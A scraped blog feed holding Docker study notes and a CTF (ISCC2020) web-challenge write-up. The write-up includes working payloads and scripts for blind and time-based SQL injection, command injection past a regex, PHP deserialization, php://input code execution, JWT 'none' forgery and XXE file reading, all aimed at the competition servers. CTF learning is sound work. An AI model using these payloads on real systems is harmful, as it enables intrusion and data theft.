Writeup","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"REGEXP注入","slug":"REGEXP注入","permalink":"https://qwzf.github.io/tags/REGEXP注入/"},{"name":"LIKE注入","slug":"LIKE注入","permalink":"https://qwzf.github.io/tags/LIKE注入/"},{"name":"题目复现","slug":"题目复现","permalink":"https://qwzf.github.io/tags/题目复现/"}],"author":"qwzf"},{"title":"Docker学习笔记(二)-常用操作、数据管理","slug":"Docker学习笔记(二)-常用操作、数据管理","date":"2020-07-12T11:05:20.000Z","updated":"2020-08-01T15:56:14.597Z","comments":true,"path":"2020/07/12/Docker学习笔记(二)-常用操作、数据管理/","link":"","permalink":"https://qwzf.github.io/2020/07/12/Docker学习笔记(二)-常用操作、数据管理/","excerpt":"","text":"0x00 前言docker已经学过一部分了，继续学习下面的部分 0x01 docker常用操作之前已经学习了容器操作和镜像操作等，但其中常见操作不太方便看于是这里先归纳之前所学的常用操作并加以补充： 1、镜像的操作docker search 镜像名 #查询镜像 docker history 镜像名 #查询历史镜像 docker pull 镜像名[:tag] #拉取镜像到本地 docker images #查看本地全部镜像 docker rmi 镜像id #删除本地镜像，id可以只写前几位 docker save -o 导出的路径 镜像id #将本地镜像导出 docker load -i 镜像文件 #加载本地镜像文件 docker tag 镜像id 镜像名:版本 #修改镜像名称 #镜像文件加载后，镜像的REPOSITORY和TAG为none。通过此命令，REPOSITORY为镜像名，TAG为版本 docker commit -a &#39;镜像作者&#39; -m &#39;镜像构建信息&#39; 容器名/容器id 构建镜像名#通过容器构建镜像，-p不暂停正在运行的容器 docker build -t=&#39;镜像名&#39; . #通过Dockerfile文件构建镜像。先创建Dockerfile文件，然后执行命令构建 docker push 镜像名[:tag] #推送镜像 2、容器的操作#运行容器，简单操作 docker run 镜像id/镜像名[:tag] #运行守护式容器 docker run -d -p 宿主机端口:容器端口 -v 宿主机目录:容器目录 --name 容器名称 镜像id/镜像名[:tag] #-d 代表后台运行容器 #-p 宿主机端口:容器端口 为了端口映射 #-v 宿主机目录:容器目录 为了目录映射 #--name 指定容器名 #-e 指定一个环境名，如MySQL容器指定MySQL密码:-e MYSQL_ROOT_PASSWORD=123456 #运行交互式容器 docker run -it 镜像id/镜像名[:tag] /bin/bash 退出交互式bash(这样容器就会在后台运行):Ctrl+P Ctrl+Q #-i 以交互模式运行容器 #-t 为创建的容器分配一个伪tty终端 docker run 镜像id/镜像名[:tag] apt-get install -y app_name #在容器安装新的程序 docker attach 容器id/容器名 #进入容器，交互式 docker ps [-qal] #查看正在运行的容器 #-a 查看全部容器，包括没有运行的 #-q 只查看容器的标识 #-l 列出最近一次启动的容器 docker logs -f 容器id/容器名 #查看容器日志 #-f 可以滚动查看日志的最后几行 docker diff 容器id/容器名 #查看容器修改操作 docker top 容器id/容器名 #查看容器内进程 docker inspect 容器id/容器名 #获取容器信息,如容器内部ip docker exec -it 容器id/容器名 /bin/bash #进入到容器内部 #也可写成docker exec -it 容器id/容器名 bash #-i 以交互模式运行容器 #-t 为创建的容器分配一个伪tty终端 docker stop 容器id/容器名 #停止指定容器 docker stop $(docker ps -qa) #停止所有容器 docker kill 容器id/容器名 #杀死指定容器 docker start 容器id/容器名 #启动容器 docker restart 容器id/容器名 #重启容器 docker rm 容器id/容器名 #删除容器(删除前，需停止容器) docker rm $(docker ps -qa) #删除所有容器(删除前，需停止容器) docker cp 文件名 容器id/容器名:容器内部路径 #将宿主机的内容复制到容器内部 3、远程访问参考之前我写的博客：Docker学习笔记(一)-容器、镜像和客户端与守护进程 0x02 Docker容器的数据管理1、Docker容器的数据卷1.数据卷数据卷是经过特殊设计的目录，可以绕过联合文件系统(UFS)，为一个或多个容器提供访问。数据卷设计目的，在于数据的永久化，它完全独立于容器的生存周期。2.数据卷的特点 数据卷在容器启动时初始化，如果容器使用的镜像在挂载点包含了数据，这些数据会拷贝到新初始化的数据卷中。 数据卷可以在容器之间共享或重用数据 可以对数据卷的内容直接进行修改 数据卷的变化不会影响镜像的更新 卷会一直存在，即使挂载数据卷的容器已经被删除 3.数据卷基本操作 数据卷：将宿主机的一个目录映射到容器的一个目录中可以在宿主机中操作目录中的内容，那么容器内部映射的文件也会跟着一起改变 （1）创建数据卷 docker volume create 数据卷名 #创建后，默认会存放在/var/lib/docker/volumes/数据卷名/_data （2）查看数据卷详细信息 docker volume inspect 数据卷名 （3）查看全部数据卷 docker volume ls （4）删除数据卷 docker volume rm 数据卷名 （5）应用数据卷 #当映射数据卷时，若数据卷不存在，Docker会自动创建。会将容器内部自带文件存储在数据卷默认路径 docker run -v 数据卷名:容器内部路径 镜像id #直接指定一个路径作为数据卷的存放位置。指定路径下是空的，不会把容器内的文件带出来 docker run -v 路径:容器内部路径 镜像id 4.数据卷的使用（1）为容器添加数据卷 docker run --name dvt1 -v ~/container_data:/data -it ubuntu /bin/bash （2）为数据卷添加访问权限 docker run --name dvt2 -v ~/datavolume:/data:ro -it ubuntu /bin/bash #ro 容器内只读 （3）使用Dockerfile构建包含数据卷的镜像 FROM ubuntu:latest VOLUME [&quot;/datavolume1&quot;,&quot;/datavolume2&quot;] CMD /bin/bash 构建镜像 docker build -t=&#39;qwzf/dvt&#39; . 运行镜像并查看镜像中指定目录 docker run --name dvt3 -it qwzf/dvt docker inspect dvt3 2、Docker的数据卷容器1.数据卷容器命名的容器挂载数据卷，其他容器通过挂载这个容器实现数据共享，挂载数据卷的容器，就叫数据卷容器。2.使用数据卷容器挂载数据卷容器的方法 docker run -it --name 其他容器 --volumes-from 数据卷容器名 镜像名 /bin/bash 例： docker run -it --name dvt4 qwzf/dvt #启动数据卷容器 docker run -it --name dvt5 --volumes-from dvt4 ubuntu /bin/bash #挂载数据卷容器 #1、数据卷虚拟机开启或者关闭对共享无影响 #2、数据卷虚拟机多次作为共享目录，也可以做共享 #3、数据卷多次挂在，有重复名字，则以最后一个--volumes-from的为最后结果 #4、如果已经挂载数据卷容器的容器，删除数据卷容器对其无影响 3、Docker数据卷的备份和还原1.数据备份 docker run --volumes-from 需要备份的容器名 -v ~/backup:/backup ubuntu tar cvf /backup/backup.tar 需要备份的目录 例： docker run --volumes-from dvt5 -v ~/backup:/backup --name dvt11 ubuntu tar cvf /backup/dvt5.tar /datavolume1 2.数据还原docker run -v 需要还原的目录 --volumes-from 需要还原的容器名 -v ~/backup:/backup ubuntu tar xvf /backup/backup.tar 例： docker run -v /datavolume1 --name dvt12 --volumes-from dvt5 -v ~/backup:/backup ubuntu tar xvf /backup/dvt5.tar 0x03 后记docker相关的基础知识又学了一些。本篇博客记录了镜像和容器的常用操作、docker容器的数据卷和数据卷容器","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"Docker","slug":"运维/Docker","permalink":"https://qwzf.github.io/categories/运维/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://qwzf.github.io/tags/Docker/"},{"name":"常用操作","slug":"常用操作","permalink":"https://qwzf.github.io/tags/常用操作/"},{"name":"数据卷容器","slug":"数据卷容器","permalink":"https://qwzf.github.io/tags/数据卷容器/"},{"name":"备份和还原","slug":"备份和还原","permalink":"https://qwzf.github.io/tags/备份和还原/"}],"author":"qwzf"},{"title":"Docker练习(一)-安装LA(N)MP、Tomcat和Nginx及MySQL","slug":"Docker练习(一)-安装LA(N)MP、Tomcat和Nginx及Nginx反向代理","date":"2020-06-30T15:02:00.024Z","updated":"2020-08-01T15:55:37.419Z","comments":true,"path":"2020/06/30/Docker练习(一)-安装LA(N)MP、Tomcat和Nginx及Nginx反向代理/","link":"","permalink":"https://qwzf.github.io/2020/06/30/Docker练习(一)-安装LA(N)MP、Tomcat和Nginx及Nginx反向代理/","excerpt":"","text":"0x01 安装LAMP可能用到的命令 #拉取镜像 docker pull tutum/lamp #查看镜像 docker images #启动容器并绑定端口 docker run -d -p 8080:80 -p 3306:3306 -v /var/www/app/:/var/www/html tutum/lamp #查看运行的容器 docker ps docker ps -a #进入正在运行的容器 docker exec -it &#39;id/name&#39; /bin/bash #退出容器 exit #开启、重启、停止容器 docker start &#39;id/name&#39; docker restart &#39;id/name&#39; docker stop &#39;id/name&#39; 具体安装过程如下：1.查询镜像 root@qwzf:~# docker search lamp NAME DESCRIPTION STARS OFFICIAL AUTOMATED linode/lamp LAMP on Ubuntu 14.04.1 LTS Container 179 mattrayner/lamp A simple LAMP docker image running the prere… 170 [OK] tutum/lamp Out-of-the-box LAMP image (PHP+MySQL) 132 greyltc/lamp a super secure, up-to-date and lightweight L… 99 [OK] fauria/lamp Modern, developer friendly LAMP stack. Inclu… 79 [OK] 2.拉取镜像 docker pull tutum/lamp 3.启动守护式容器并端口映射和挂载目录 root@qwzf:~# docker run --name=lamp -d -p 8080:80 -p 3306:3306 -v /var/www/app/lamp/:/var/www/html tutum/lamp #8080 宿主机端口 80 docker端口 #/var/www/app/lamp/ 宿主机要挂载的目录 #/var/www/html docker上被挂载的位置 0x02 安装LNMP1.查询镜像 docker search lnmp 2.拉取镜像 docker pull winstonpro/lnmp 3.启动守护式容器并端口映射和挂载目录 root@qwzf:~# docker run --name=lnmp -d -p 8000:80 -p 3000:3306 -v /var/www/app/lnmp/:/usr/share/nginx/html winstonpro/lnmp 0x03 安装vim方式一：默认源安装执行apt-get update更新源 root@dc3d333fc181:~# apt-get update 更新完过后我们就可以安装了vim了 root@dc3d333fc181:~# apt-get install vim 以上的方式虽然可以实现安装vim，但是速度很慢。下面是更快的方式方式二：aliyun源安装因为没有vi,vim编辑工具，我这里使用sed命令进行编辑文件内容。首先查看默认源地址： root@dc3d333fc181:~# cat /etc/apt/sources.list # deb http://snapshot.debian.org/archive/debian/20200130T000000Z buster main deb http://deb.debian.org/debian buster main # deb http://snapshot.debian.org/archive/debian-security/20200130T000000Z buster/updates main deb http://security.debian.org/debian-security buster/updates main # deb http://snapshot.debian.org/archive/debian/20200130T000000Z buster-updates main deb http://deb.debian.org/debian buster-updates main 从上面的输出内容我们可以看出，默认会从deb.debian.org去更新源信息。我们将其替换为aliyun的源地址： root@dc3d333fc181:~# sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list 替换完源后我们就可以安装vim了 root@dc3d333fc181:~# apt-get clean root@dc3d333fc181:~# apt-get update root@dc3d333fc181:~# apt-get install vim 0x04 安装Tomcat1.查找tomcat镜像 docker search tomcat 2.拉取tomcat版本为7的镜像可以先看一下镜像是否已经拉取 docker images 拉取tomcat版本为7的镜像 docker pull tomcat:7 3.启动Tomcat可以先看一下容器是否已经启动 docker ps -a 没找到，说明没启动，需要启动tomcat容器。查看一下tomcat镜像 docker images 启动Tomcat容器 docker run --name tomcat -d -p 8000:8080 734d712b8777 容器启动成功。4.移动Tomcat自带的项目文件ROOT进入容器 docker exec -it tomcat /bin/bash 将webapps.dist目录文件下tomcat自带的项目文件ROOT移动到webapps目录文件下 mv ./webapps.dist/ROOT webapps/ 5.访问测试访问测试一下 访问成功，Tomcat服务构建成功。 0x05 安装Nginx并实现反向代理 1.查找nginx镜像 docker search nginx 2.拉取nginx镜像拉取箭头所指的镜像 docker pull nginx 3.启动nginx容器 docker run --name nginx_1 –d –p 8888:80 nginx 4.访问测试 访问成功，说明nginx安装成功。5.设置反向代理并测试首先进入容器 docker exec -it nginx_1 /bin/bash 安装vim sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list apt-get clean apt-get update apt-get install vim 用vim打开nginx.conf配置文件，并添加以下选项 vim /etc/nginx/nginx.conf 打开/etc/nginx/conf.d/目录，发现.conf后缀的文件只有default.conf文件。打开default.conf文件配置反向代理： vim /etc/nginx/conf.d/default.conf server{ listen 80; server_name 39.105.93.165:8888; #nginx反向代理服务器IP地址或域名 location / { root /usr/log/nginx/html; index index.html index.htm; proxy_pass http:39.105.93.165:8000; #被代理的服务IP地址或域名 } 意思是：通过访问http://39.105.93.165:8888，其实访问到的是http://39.105.93.165:8000保存退出，然后重启容器 docker restart nginx_1 然后访问http://39.105.93.165:8888 这样访问的nginx服务器http://39.105.93.165:8888其实是访问到了的是服务地址为http://39.105.93.165:8000的tomcat服务从而实现简单的反向代理。 0x06 安装MySQL 1.查找MySQL镜像 docker search mysql 2.拉取MySQL版本5.7的镜像 docker pull mysql:5.7 3.启动MySQL容器 docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 4.使用navicat连接测试 连接成功，说明MySQL安装成功5.目录映射先停止并删除MySQL的docker容器 docker stop mysql docker rm mysql 使用-v选项对/etc/mysql、/var/log/mysql、/var/lib/mysql目录进行目录映射 docker run --name mysql_1 -p 3306:3306 \\ -v /usr/local/docker/mysql/conf:/etc/mysql \\ -v /usr/local/docker/mysql/logs:/var/log/mysql \\ -v /usr/local/docker/mysql/data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 映射成功","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"Docker","slug":"运维/Docker","permalink":"https://qwzf.github.io/categories/运维/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://qwzf.github.io/tags/Docker/"},{"name":"服务安装","slug":"服务安装","permalink":"https://qwzf.github.io/tags/服务安装/"}],"author":"qwzf"},{"title":"ISCC2020练武题Web总结","slug":"ISCC2020练武题Web总结","date":"2020-06-03T07:18:55.247Z","updated":"2020-06-05T16:55:53.413Z","comments":true,"path":"2020/06/03/ISCC2020练武题Web总结/","link":"","permalink":"https://qwzf.github.io/2020/06/03/ISCC2020练武题Web总结/","excerpt":"","text":"前言接下来，继续总结练武题的Web题 Web1：Where is file?题目难度：简单考察：伪协议打开题目，发现以下内容： &lt;?php show_source(__FILE__); echo $_GET[&#39;hello&#39;]; $file=$_GET[&#39;file&#39;]; while (strstr($file, &quot;file://&quot;)) { $file=str_replace(&quot;file://&quot;, &quot;&quot;, $file); } include($file); ?&gt; 发现很基础，使用伪协议(根据源码，不能使用file协议)读取flag内容：php://filterphp://input ?file=php://input post: &lt;?php system(&#39;ls&#39;); ?&gt; //列目录 post: &lt;?php system(&#39;cat flag.php&#39;); ?&gt; //查看flag.php内容，但执行后要查看源代码才能看到 等等其他伪协议。使用一个即可。(不过由于题目某些原因(可能是改题了)总结的时候，不能用php://input了) Web2：阿森的爱情-1题目难度：简单考察：目录扫描dirsearch直接扫，在readme.txt中发现flag题应该中途改题了，写总结时，扫不出来了，并且直接访问readme.txt，也没flag Web3：寻找小明-2考察：脑洞小明丢了2333.。。。。找遍了寻找小明-1也没找到线索。。。并且是0解题。 Web4：阿森的爱情-2题目难度：普通考察：过滤括号()的SQL盲注fuzz一下，发现过滤了括号()这个是过滤括号()的SQL注入，在做某入群题时遇到过(虽然某入群题最终考察的不是这个)并且当时还搜到了一篇博客：CTF中过滤括号的盲注题小记这个题应该就是改博客里的那道题得到的。 过滤括号的盲注这里先本地搭建环境，简单理解并测试一下这个知识点：测试数据: +----+----------+----------------------------------+ | Id | username | password | +----+----------+----------------------------------+ | 1 | admin | bfe42ac26e273ef3a859a651e0a02df0 | +----+----------+----------------------------------+ 由于这道题显示的是第二列内容，于是可以通过使用order by操作第三列同时改变联合查询第三列的值，来判断网站数据库表中第三列下的数据。 select * from test.test0 union select 1,2,&#39;c&#39; order by 3,2; order by 3,2表示先以第三列排序，如果遇到第三列内容完全相同则再使用第二列进行相同行的排序。而为了方便起见，这里只测试以第三列排序的：payload select * from flag union select 1,2,&#39;c&#39; order by 3; 当联合查询中第三列的字符如果小于等于真实的第三列密码字符则会页面会显示字符2，否则显示admin mysql&gt; select * from flag union select 1,2,&#39;a&#39; order by 3; +----+----------+----------------------------------+ | Id | username | password | +----+----------+----------------------------------+ | 1 | 2 | a | | 1 | admin | bfe42ac26e273ef3a859a651e0a02df0 | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) mysql&gt; select * from flag union select 1,2,&#39;b&#39; order by 3; +----+----------+----------------------------------+ | Id | username | password | +----+----------+----------------------------------+ | 1 | 2 | b | | 1 | admin | bfe42ac26e273ef3a859a651e0a02df0 | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) mysql&gt; select * from flag union select 1,2,&#39;c&#39; order by 3; +----+----------+----------------------------------+ | Id | username | password | +----+----------+----------------------------------+ | 1 | admin | bfe42ac26e273ef3a859a651e0a02df0 | | 1 | 2 | c | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) 于是通过对第三列进行排序可以判断第三列所存储的密码，其真实密码等于页面显示admin判定出来的每一个字符减1。所以直接改一下脚本，跑脚本得到md5值，md5解密得到flag import requests url = &quot;http://101.201.126.95:7006/&quot; alist = &quot;0123456789abcdef&quot; payload = &quot;&quot; payload1 = &quot;admin&#39; union select 1,2,&#39;&quot; #将&#39; or 1改成了admin&#39; payload2 = &quot;&#39; from admin order by 3 #&quot; datas = {&quot;username&quot;:&quot;&quot;, &quot;password&quot;:&quot;&quot; } tmp_OK = &quot;&quot; tmp = &quot;&quot; for j in range(0,32): for i in alist: payload = payload1+tmp_OK+i+payload2 datas[&quot;username&quot;] = payload #print datas r = requests.post(url=url,data=datas) #print r.text if &quot;admin&quot; in r.text: #将whaleadmin改成了admin tmp_OK += tmp print(tmp_OK) break if (&quot;2&quot; in r.text) and (i == &quot;f&quot;): tmp_OK += i print(tmp_OK) tmp = i Web5：Php is the best language题目难度：简单考察：PHP反序列化当时做的时候题目环境没问题。现在被大佬们搞崩了。也没截图，不过还好保存了源码，就本地搭个环境做一下好了。 &lt;?php @error_reporting(1); include &#39;flag.php&#39;; class baby { public $file; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (base64_encode(file_get_contents($filename))) { return base64_encode(file_get_contents($filename)); } } } } if (isset($_GET[&#39;data&#39;])) { $data = $_GET[&#39;data&#39;]; $good = unserialize($data); echo $good; } else { $url=&#39;./index.php&#39;; } $html=&#39;&#39;; if(isset($_POST[&#39;test&#39;])){ $s = $_POST[&#39;test&#39;]; $html.=&quot;&lt;p&gt;谢谢参与!&lt;/p&gt;&quot;; } ?&gt; 很明显，反序列化，构造exp &lt;?php class baby { public $file=&quot;flag.php&quot;; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (base64_encode(file_get_contents($filename))) { return base64_encode(file_get_contents($filename)); } } } } $test1=new baby; print_r(serialize($test1)); ?&gt; 由exp生成payload: O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 输入payload，然后Base64解码，得到flag PD9waHAgJGE9J2ZsYWd7dV9yX3JlYWxseV9hX3BocF9leHBlcnR9Jzs/Pg0K Web6：阿帅的爱情题目难度：简单考察：PHP代码审计+命令执行漏洞+绕过正则 &lt;?php if(!isset($_GET[&quot;ip&quot;])){ show_source(__file__); } else { $ip=$_GET[&quot;ip&quot;]; $pattern=&quot;/[;|&amp;].*[a-zA-Z]+/&quot;; if(preg_match($pattern,$ip)!=0){ die(&#39;bad domain&#39;); } try { $result = shell_exec(&#39;ping -c 4 &#39; . $ip); } catch(Exception $e) { $result = $e-&gt;getMessage(); echo $result; } $result = str_replace(&quot;\\n&quot;, &quot;&lt;br&gt;&quot;, $result); echo $result; } get传一个ip参数，然后对ip的参数值进行正则匹配。正则过滤命令执行的所有分隔符。于是尝试绕过，找到有下面几种绕过方式： %0acat %0Acat 参考：浅谈CTF中命令执行与绕过的小技巧然后执行ls命令列出目录下的文件，发现flag.php。然后cat flag.php，下面其中一种方法的payload ?ip=%0als ?ip=%0acat flag.php 或 ?ip=127.0.0.1%0als ?ip=127.0.0.1%0acat flag.php Web7：寻找小明-3小明丢了。。。师傅们估计是盲猜出来的ip。 Web8：神秘组织的邮件-2题目难度：普通考察：计算题脚本编写打开题目链接发现5个数字，由神秘组织的邮件-1的flag{加减乘除}，想到应该是将上边五个数中间添加上“加减乘除”，并且需要在极短的时间内计算并提交结果，于是写脚本即可。同时做这道题发现了一道类似的脚本题：bugku 秋名山老司机 以及 hackinglab 快速口算于是我写出这道题的加减乘除计算并提交结果的脚本(写完后，发现这个脚本并没有想象中的那么难)： import re import requests url=&quot;http://101.201.126.95:7010/&quot; headers={&quot;Cookie&quot;:&quot;PHPSESSID=e8iv7en9e33sqp6mi0j2c6ff7i&quot;} s=requests.Session() r=s.get(url,headers=headers) content=r.text content=re.sub(r&quot;&lt;/?(.+?)&gt;&quot;,&quot;&quot;,content)#去掉html标签 content=re.sub(&#39;Result:&#39;,&#39;&#39;,content) #替换Result:为空 content=content.strip() #去除字符串左右两端的空格和\\t、\\r、\\n print(content) num=content.split(&#39; &#39;) #这里是空格当做列表分隔符 print(num) #num = list(map(int, n))#将列表转换为int型 #payload=num[0]+num[1]-num[2]*num[3]/num[4] payload=int(num[0])+int(num[1])-int(num[2])*int(num[3])/int(num[4]) print(payload) data = {&quot;result&quot;:payload} r = s.post(url=url+&quot;result.php&quot;,headers=headers,data=data) print(r.text) 顺带贴出我们团队的lemon写的脚本(有时候跑一次跑不出来结果，需要多跑几次，不晓得为啥)，用到了Python爬虫的解析库BeautifulSoup(Python爬虫我才学一点，还不太熟悉，所以我写脚本就没用它) import re import requests from bs4 import BeautifulSoup url=&quot;http://101.201.126.95:7010/&quot; headers={&quot;Cookie&quot;:&quot;PHPSESSID=e8iv7en9e33sqp6mi0j2c6ff7i&quot;} s=requests.Session() response=s.get(url,headers=headers) content=response.text #print(r) soup = BeautifulSoup(content,&#39;lxml&#39;) li_list = soup.find_all(text=re.compile(&#39;\\d&#39;)) result = [x.strip() for x in li_list if x.strip()!=&#39;&#39;] str = &quot;&quot;.join(result) a=str.split(&#39; &#39;) numbers = list(map(int, a)) print(numbers) payload =numbers[0]+numbers[1]-numbers[2]*numbers[3]/numbers[4] print(payload) data = {&#39;result&#39;: payload} reponse = requests.post(url=url+&quot;result.php&quot;,headers=headers,data=data).text print(reponse) 跑脚本，得到文件名(同时是测出来是安卓题神秘组织的邮件-3的压缩包密码)。浏览器访问txt文件失败，使用python脚本访问成功 import requests url=&quot;http://101.201.126.95:7010/IS20CC20abc%$.txt&quot; r=requests.get(url).text print(r) 发现如果result解码后的结果等于flag.php，跳转到flag.php。我觉得整正常情况下直接在上边post传入result参数，且参数值是flag.php的Base64编码后的结果，即 import requests url=&quot;http://101.201.126.95:7010/result.php&quot; headers={&quot;Cookie&quot;:&quot;PHPSESSID=e8iv7en9e33sqp6mi0j2c6ff7i&quot;} data={&#39;result&#39;:&#39;ZmxhZy5waHA=&#39;} r=requests.post(url=url,headers=headers,data=data).text print(r) 然而题可能出的有点问题(仅代表个人观点)，直接访问flag.php就得到flag了2333333。。。。(还有个坑就是注意不要直接写脚本访问，可以使用burp抓包改包发包)。如果题目是这样的话，直接尝试burp抓包访问flag.php不就好了(这应该就是传说中的另类的盲猜flag了?!)。不过按照上边正常的思路来可以得到IS20CC20abc%$.txt，而神秘组织的邮件-3的压缩包密码就是IS20CC20abc%$，还是有一点用处的。。。。 Web9：未知的风险-2题目难度：较难考察：File Vault原题改的，没搞出来。现在也无法复现，于是参考wp学习一下可以参考：ISCC 2020 Web WriteUpinsomnihack-teaser-2018/file-vault 学习Insomnihack Teaser 2018 / File Vault Web10：ISCC成绩查询-2题目难度：普通考察：SQL时间盲注+过滤空格和#看到题，先在用扫描工具扫一下，发现flag.php然后直接访问http://101.201.126.95:7007/flag.php发现直接跳转到index.php。于是使用burp进行抓包重放发现是从pikachu靶场sql注入改的并且需要get传参两个参数name和submit然后传参，无论怎么测试，就只显示一个页面(也就是所谓无回显)，于是考虑SQL时间盲注先fuzz一下，发现过滤了空格和#，空格可用/**/代替，#可以用%23代替。参考：对MYSQL注入相关内容及部分Trick的归类小结于是写出测试的基本语句，并测试： &#39;/**/or/**/if(1=1,sleep(3),1)%23 发现果然响应比正常慢了很多，说明测试语句没问题。开始进行盲注，于是我写出解题脚本： import requests import string import time import datetime if __name__ == &quot;__main__&quot;: chars=string.ascii_letters+string.digits url=&quot;http://101.201.126.95:7007/flag.php&quot; #payload=&quot;&#39;/**/or/**/if((ascii(substr(database(),{0},1))={1}),sleep(3),1)%23&quot; #pikachu #payload=&quot;&#39;/**/or/**/if((ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{0},1))={1}),sleep(3),1)%23&quot;#flag #payload=&quot;&#39;/**/or/**/if((ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=\\&quot;flag\\&quot;/**/limit/**/0,1),{0},1))={1}),sleep(3),1)%23&quot; payload=&quot;&#39;/**/or/**/if((ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),{0},1))={1}),sleep(3),1)%23&quot; print(&quot;数据：&quot;) name=&#39;&#39; for i in range(1,40): char=&#39;&#39; for j in chars: payloads=payload.format(i,ord(j)) urls=url+&quot;?name=&quot;+payloads+&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot; t1=datetime.datetime.now() r=requests.get(url=urls) t2=datetime.datetime.now() sec = (t2 - t1).seconds if sec&gt;=3: name+=j print(name) char=j break if char==&#39;&#39;: break 依次跑上边的脚本，得到当前数据库名、数据表名、字段名和记录。发现是md5加密后的，找一个在线的md5解密网站解密即可。解密结果是sixsixsix，即是flag，加上flag{}提交即可。看了一下ISCC成绩查询-3，很明显666是是线索，也就是key。于是顺带做出ISCC成绩查询-3 Web11：ISCC成绩查询_3：题目难度：简单考察：PHP可逆加密解密算法进入题目F12查看源码，发现以下代码： &lt;?php function encrypt($data, $key) { $key = md5($key); $x = 0; $len = strlen($data); $l = strlen($key); for ($i = 0; $i &lt; $len; $i++) { if ($x == $l) { $x = 0; } $char .= $key{$x}; $x++; } for ($i = 0; $i &lt; $len; $i++) { $str .= chr(ord($data{$i}) + (ord($char{$i})) % 256); } return base64_encode($str); } ?&gt; 百度一搜，发现是原题参考：PHP 加密与解密、PHP加密解密代码bugku上也有类似的，就变了一点的题，参考：bugku-PHP_encrypt_1(ISCCCTF)不过还是自己先审计一下代码的大致意思，自己写一下解密： 1.定义一个函数，接收data和key 2.对传过来的key进行md5加密赋值给$key；令变量$x = 0；将传过来的data取长度赋值给$len；将传过来的key取长度赋值给$l 3.然后来一个for循环，将md5加密后key进行截取和data长度一样，并存放在$char。 4.然后再来一个for循环，让(原文每个字符+密钥对应每个字符)%256得到密文，赋值给$str 5.对$str进行base64加密后，返回。 于是考虑解密算法大致应该这样写： 1.先算出key的md5，即是密钥 2.然后对data进行base64解码得到密文 3.密文每个字符-密钥，如果&lt;0再加256；否则不用加 4.最后返回最终结果 于是写出对应(将题目中的字符串作为data，ISCC成绩查询_2得到的666作为key)解密的PHP脚本： &lt;?php function decrypt($data, $key){ $key = md5($key); $x = 0; $data = base64_decode($data); $len = strlen($data); $l = strlen($key); for ($i = 0; $i &lt; $len; $i++){ if ($x == $l){ $x = 0; } $char .= substr($key, $x, 1); $x++; } for ($i = 0; $i &lt; $len; $i++){ if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1))){ $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1))); }else{ $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1))); } } return $str; } $data = &#39;qKe4j6uFeqaTe5rVqqaXiKig25o=&#39;; // 被加密信息 $key = &#39;666&#39;; // 密钥 $decrypt = decrypt($data, $key); echo $decrypt; ?&gt; 运行这段PHP代码，即可得到flag。 Web12：What can images do题目难度：简单考察：文件上传+图片马当时做的时候没一点问题。总结的时候，发现又被某个”大佬”改了上传文件目录的权限被改了，无法上传文件。不过还好做的时候截图了。(最后比赛快结束时，题目又被修复了)首先上传一个图片马然后抓包，使用这个功能包含上传的图片马然后使用蚁剑连接，找到flag文件打开即可 Web13：未知的风险-1题目难度：较难考察：JWT绕过(破解key或设置加密为空)+xxe参考：从hfctf学习JWT伪造总结时，发现题目依旧被大佬们搞崩了(然后又被修复好了)。这里就放上之前做的时候的截图吧。设置加密为空，然后将原来的token使用jwt工具构造payload eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 .eyJpZCI6InVzZXIiLCJpYXQiOjE1ODgzMDk5MDEsImp0aSI6ImVjZWNlM2YyOTFmZmRiZDVjMmMxOTVkZmU2OGMyNGRiIn0. 设置为token访问,发现username和password，设置username和password再次生成payload eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6InVzZXIiLCJpYXQiOjE1ODgzMDk5MDEsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluMTIzIiwianRpIjoiZWNlY2UzZjI5MWZmZGJkNWMyYzE5NWRmZTY4YzI0ZGIifQ. 访问，然后抓包，发现xml内容，并且和xxe的xxe-lab靶场很像。于是猜测使用xxe读取flag文件。首先，先读取/etc/passwd测试一下，发现果然存在xxe漏洞。然后先读取doLogin.phpBase64解码发现flag文件路径 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;!DOCTYPE hack [ &lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt; ]&gt; &lt;user&gt; &lt;username&gt;&amp;file;&lt;/username&gt; &lt;password&gt;hack&lt;/password&gt; &lt;/user&gt; 然后读取flag.php文件，再Base64解码得到flag 